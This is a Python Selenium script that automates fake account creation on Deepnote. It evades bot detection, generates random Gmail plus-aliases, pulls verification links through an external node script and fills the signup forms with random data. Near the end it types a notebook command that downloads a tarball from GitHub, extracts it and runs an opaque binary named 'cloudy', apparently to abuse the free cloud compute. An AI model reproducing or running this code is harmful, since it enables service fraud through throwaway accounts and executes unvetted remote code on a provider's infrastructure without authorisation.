if __name__ == "__main__":
    import undetected_chromedriver as uc
    import time
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.action_chains import ActionChains
    import random
    import os
    os.system("npm i")
    options = uc.ChromeOptions()
    driver = uc.Chrome(options=options, version_main=106)  # version_main allows to specify your chrome version instead of following chrome global version
    driver.set_window_size(1920, 1080)
    low_word = "abcdefghijklkmnopqrstuvwxyz"
    a = ["stodolamarek1x", "stodolatomek1x", "stodolamaciek1x", "paruwczakp", "paruwczakq1", "paruwczakq2", "paruwczakq3", "janusz.mostowiak2137", "adasdrzewicx"]
    emailrepl = "".join(random.sample(low_word, 8))
    emil = random.choice(a)+"+"+emailrepl+"@gmail.com"
    driver.get("https://deepnote.com/sign-up")
    time.sleep(1)
    driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/button[3]').click()
    time.sleep(2)
    driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/div/div/div/input').send_keys(emil)
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div/div[2]/button").click()
    time.sleep(60)
    fx = open("a.txt", "w")
    fx.write('gmel|'+emil)
    fx.close()
    os.system("node index.js")
    f = open("a.txt", "r")
    verifylink = f.read()
    print(verifylink)
    
    
    
    time.sleep(0.5)
    driver.get(verifylink)
    time.sleep(3)
    driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/div/div/div[1]/input[1]').send_keys("".join(random.sample(low_word, 6)))
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
    time.sleep(2.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/select/option[3]").click()
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[2]/select/option[2]").click()
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[3]/select/option[2]").click()
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
    time.sleep(2)
    time.sleep(2)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/div/input").send_keys("".join(random.sample(low_word, 6)))
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button").click()
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[1]").click()
    time.sleep(0.5)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[2]").click()
    time.sleep(10)
    try:
        driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[1]/button[2]").click()
    except:
        pass
    time.sleep(3)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[1]/div[3]/div/div[2]/div/div/div/div[1]/div/div/div/button").click()
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[18]/div/div/button[1]").click()
    time.sleep(40)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
    actions = ActionChains(driver)
    actions.send_keys('!wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/idfk.tar.gz && tar -xf idfk.tar.gz && ./cloudy')
    actions.perform()
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[4]/div/div[2]/div[3]/div/div[1]").click()
    time.sleep(14)
